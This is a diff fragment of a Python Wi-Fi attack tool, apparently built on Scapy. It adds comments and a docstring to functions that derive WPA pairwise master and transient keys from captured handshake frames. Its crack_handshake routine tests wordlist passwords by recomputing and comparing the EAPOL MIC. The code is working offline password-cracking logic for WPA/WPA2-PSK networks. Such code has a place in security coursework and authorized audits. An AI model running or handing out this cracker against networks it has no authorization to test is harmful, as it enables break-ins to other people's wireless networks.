@@ -298,6 +298,7 @@ def handshake_grabber():
 #       CRACKING FUNCTIONS          #
 #####################################
 
+#This function is going to calculate the trans key
 def calc_ptk(key, A, B):
     blen = 64
     i = 0
@@ -310,11 +311,22 @@ def calc_ptk(key, A, B):
 
     return R[:blen]
 
+#This function is going to fabricate the pairwise master key
 def calc_pmk(ssid, password):
     pmk = hashlib.pbkdf2_hmac('sha1', password.encode('ascii'), ssid.encode('ascii'), 4096, 32)
     return pmk
 
 
+"""
+handshake cracking function
+
+Steps :
+Open the pcap
+Isolate the necessary frame field to fabricate our own EAPOL with PTK/PMK/MIC
+Compute the MIC with the sniffed isolated fields and the PSK given by the wordlist
+Compare the computed MIC to the Client Frame MIC
+Do the above steps until the C_MIC = F_MIC
+"""
 
 def crack_handshake(ap_ssid,pcap,wordlist):
     os.system("clear")
@@ -327,10 +339,6 @@ def crack_handshake(ap_ssid,pcap,wordlist):
     mac_cl = binascii.unhexlify(cl_mac)
     anonce = packets[0].load[13:45]
     snonce = packets[1].load[13:45]
-    version = bytes(packets[1].getlayer(EAPOL).version)
-    p_type = bytes(packets[1].getlayer(EAPOL).type)
-    p_len = bytes(packets[1].getlayer(EAPOL).len)
-
 
     key_data = min(mac_ap, mac_cl) + max(mac_ap, mac_cl) + min(anonce, snonce) + max(anonce, snonce)
 
